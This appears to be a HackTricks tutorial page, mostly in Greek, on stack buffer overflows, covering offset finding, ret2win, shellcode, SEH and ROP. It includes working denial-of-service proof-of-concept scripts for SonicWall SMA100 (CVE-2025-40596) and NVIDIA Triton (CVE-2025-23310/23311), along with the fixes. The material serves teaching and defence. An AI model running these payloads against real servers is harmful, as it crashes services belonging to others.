# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι ένα Stack Overflow

A **stack overflow** is a vulnerability that occurs when a program writes more data to the stack than it is allocated to hold. This excess data will **overwrite adjacent memory space**, leading to the corruption of valid data, control flow disruption, and potentially the execution of malicious code. This issue often arises due to the use of unsafe functions that do not perform bounds checking on input.

Το κύριο πρόβλημα αυτής της υπεργραφής είναι ότι ο **saved instruction pointer (EIP/RIP)** και ο **saved base pointer (EBP/RBP)** που χρησιμοποιούνται για την επιστροφή στην προηγούμενη συνάρτηση **αποθηκεύονται στη stack**. Επομένως, ένας επιτιθέμενος θα μπορεί να τους υπεγράψει και να **ελέγξει τη ροή εκτέλεσης του προγράμματος**.

Η ευπάθεια συνήθως προκύπτει επειδή μια συνάρτηση **αντιγράφει στη stack περισσότερα bytes απ' όσα έχουν δεσμευτεί για αυτήν**, επιτρέποντας έτσι την υπεργραφή άλλων τμημάτων της stack.

Κάποιες κοινές συναρτήσεις ευάλωτες σε αυτό είναι: **`strcpy`, `strcat`, `sprintf`, `gets`**... Επίσης, συναρτήσεις όπως **`fgets`**, **`read`** & **`memcpy`** που παίρνουν ένα **length argument**, μπορεί να χρησιμοποιηθούν με ευάλωτο τρόπο αν το καθορισμένο μήκος είναι μεγαλύτερο από το δεσμευμένο.

Για παράδειγμα, οι παρακάτω συναρτήσεις θα μπορούσαν να είναι ευάλωτες:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Εύρεση offset για Stack Overflows

Ο πιο συνηθισμένος τρόπος για να εντοπίσετε stack overflows είναι να δώσετε μια πολύ μεγάλη είσοδο από `A` (π.χ. `python3 -c 'print("A"*1000)'`) και να περιμένετε ένα `Segmentation Fault` που υποδεικνύει ότι η **διεύθυνση `0x41414141` επιχειρήθηκε να προσπελαστεί**.

Επιπλέον, μόλις βρείτε ότι υπάρχει ευπάθεια Stack Overflow θα χρειαστεί να βρείτε τον offset μέχρι να είναι δυνατό να **overwrite the return address**, για αυτό συνήθως χρησιμοποιείται μια **De Bruijn sequence.** Η οποία, για ένα δεδομένο αλφάβητο μεγέθους _k_ και υποακολουθίες μήκους _n_, είναι μια **κυκλική ακολουθία στην οποία κάθε δυνατή υποακολουθία μήκους _n_ εμφανίζεται ακριβώς μία φορά** ως συνεχόμενη υποακολουθία.

Με αυτόν τον τρόπο, αντί να χρειάζεται να υπολογίσετε χειροκίνητα ποιος offset απαιτείται για να ελέγξετε το EIP, μπορείτε να χρησιμοποιήσετε ως padding μία από αυτές τις ακολουθίες και στη συνέχεια να βρείτε τον offset των bytes που κατέληξαν να την επικαλύψουν.

It's possible to use **pwntools** for this:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
ή **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Εκμετάλλευση Stack Overflows

Κατά τη διάρκεια ενός overflow (υποθέτοντας ότι το μέγεθος του overflow είναι αρκετά μεγάλο) θα μπορείτε να **overwrite** τιμές τοπικών μεταβλητών μέσα στο stack μέχρι να φτάσετε τους αποθηκευμένους **EBP/RBP and EIP/RIP (or even more)**.\
Ο πιο κοινός τρόπος κατάχρησης αυτού του τύπου ευπάθειας είναι με **τροποποίηση του return address** έτσι ώστε όταν η συνάρτηση τερματίσει το **control flow** να ανακατευθυνθεί όπου έχει οριστεί στον pointer από τον χρήστη.

Ωστόσο, σε άλλα σενάρια ίσως αρκεί απλώς η **overwriting some variables values in the stack** για την εκμετάλλευση (όπως σε εύκολες CTF προκλήσεις).

### Ret2win

Σε αυτό το είδος CTF challenges, υπάρχει μια **function** μέσα στο binary που **never called** και την οποία **πρέπει να καλέσετε για να κερδίσετε**. Για αυτές τις προκλήσεις χρειάζεται μόνο να βρείτε το **offset to overwrite the return address** και να **βρείτε τη διεύθυνση της function** που θα καλέσετε (συνήθως [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) θα είναι disabled) έτσι ώστε όταν η ευπαθής function επιστρέψει, η κρυφή function θα κληθεί:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

Σε αυτό το σενάριο ο attacker μπορεί να τοποθετήσει ένα shellcode στο stack και να εκμεταλλευτεί το ελεγχόμενο EIP/RIP για να κάνει jump στο shellcode και να εκτελέσει αυθαίρετο κώδικα:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

Σε 32-bit Windows, ένα overflow μπορεί να overwrite το Structured Exception Handler (SEH) chain αντί για τη σωζόμενη return address. Η εκμετάλλευση συνήθως αντικαθιστά τον SEH pointer με ένα POP POP RET gadget και χρησιμοποιεί το 4-byte πεδίο nSEH για ένα σύντομο jump ώστε να pivot πίσω στο μεγάλο buffer όπου βρίσκεται το shellcode. Ένα κοινό pattern είναι ένα σύντομο jmp στο nSEH που καταλήγει σε ένα 5-byte near jmp τοποθετημένο λίγο πριν το nSEH για να κάνει jump εκατοντάδες bytes πίσω στην αρχή του payload.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Αυτή η τεχνική είναι το βασικό πλαίσιο για να παρακάμψετε την κύρια προστασία στην προηγούμενη τεχνική: **No executable stack (NX)**. Επίσης επιτρέπει την υλοποίηση πολλών άλλων τεχνικών (ret2lib, ret2syscall...) που θα οδηγήσουν στην εκτέλεση αυθαίρετων εντολών εκμεταλλευόμενες υπάρχουσες instructions στο binary:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Ένα overflow δεν θα είναι πάντα στο stack — μπορεί επίσης να βρίσκεται στο **heap**, για παράδειγμα:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Τύποι προστασιών

Υπάρχουν διάφορες προστασίες που προσπαθούν να αποτρέψουν την εκμετάλλευση ευπαθειών — δείτε τις στο:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

Μια καλή επίδειξη του γιατί **`sscanf` δεν πρέπει ποτέ να εμπιστεύεστε για parsing μη αξιόπιστης εισόδου** εμφανίστηκε το 2025 στη συσκευή SonicWall’s SMA100 SSL-VPN.
Η ευπαθής ρουτίνα μέσα στο `/usr/src/EasyAccess/bin/httpd` προσπαθεί να εξάγει την έκδοση και το endpoint από οποιοδήποτε URI που ξεκινά με `/__api__/`:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Η πρώτη μετατροπή (`%2s`) αποθηκεύει με ασφάλεια **δύο** bytes στο `version` (π.χ. "v1").
2. Η δεύτερη μετατροπή (`%s`) **δεν έχει προσδιοριστή μήκους**, επομένως το `sscanf` θα συνεχίσει να αντιγράφει **μέχρι το πρώτο NUL byte**.
3. Επειδή το `endpoint` βρίσκεται στην **stack** και έχει μήκος **0x800 bytes**, η παροχή ενός path μεγαλύτερου από 0x800 bytes καταστρέφει τα πάντα που βρίσκονται μετά το buffer ‑ συμπεριλαμβανομένου του **stack canary** και της **saved return address**.

Ένα proof-of-concept μίας γραμμής αρκεί για να προκαλέσει το crash **πριν την αυθεντικοποίηση**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Ακόμα κι αν οι stack canaries τερματίζουν τη διεργασία, ο επιτιθέμενος εξακολουθεί να αποκτά μια δυνατότητα **Denial-of-Service** (και, με επιπλέον information leaks, ενδεχομένως εκτέλεση κώδικα). Το μάθημα είναι απλό:

* Να ορίζετε πάντα ένα **μέγιστο πλάτος πεδίου** (π.χ. `%511s`).
* Προτιμήστε ασφαλέστερες εναλλακτικές όπως `snprintf`/`strncpy_s`.

### Πραγματικό Παράδειγμα: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

Το NVIDIA Triton Inference Server (≤ v25.06) περιείχε πολλαπλά **stack-based overflows** προσβάσιμα μέσω της HTTP API.
Το ευάλωτο μοτίβο εμφανιζόταν επανειλημμένα στα `http_server.cc` και `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) επιστρέφει τον **αριθμό των internal buffer segments** που συνθέτουν το τρέχον HTTP request body.
2. Κάθε segment προκαλεί την κατανομή ενός `evbuffer_iovec` **16-byte** στο **stack** μέσω `alloca()` – **χωρίς κανένα άνω όριο**.
3. Καταχρώμενος το **HTTP _chunked transfer-encoding_**, ένας client μπορεί να αναγκάσει το request να χωριστεί σε **hundreds-of-thousands of 6-byte chunks** (`"1\r\nA\r\n"`). Αυτό κάνει το `n` να αυξάνεται χωρίς όριο μέχρι να εξαντληθεί το stack.

#### Απόδειξη Πρωτοτύπου (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Ένα ~3 MB αίτημα είναι αρκετό για να υπεργράψει την αποθηκευμένη διεύθυνση επιστροφής και να **crash** το daemon σε ένα default build.

#### Επιδιόρθωση & Μετριασμός
Η έκδοση 25.07 αντικαθιστά την ανασφαλή κατανομή στη στοίβα με ένα **heap-backed `std::vector`** και χειρίζεται ομαλά το `std::bad_alloc`:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Διδάγματα:
* Μην καλείτε ποτέ `alloca()` με μεγέθη που ελέγχονται από τον επιτιθέμενο.
* Chunked requests μπορούν να αλλάξουν δραστικά το σχήμα των server-side buffers.
* Επικυρώστε / περιορίστε κάθε τιμή που προκύπτει από client input *πριν* τη χρήση της σε memory allocations.

## Αναφορές
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
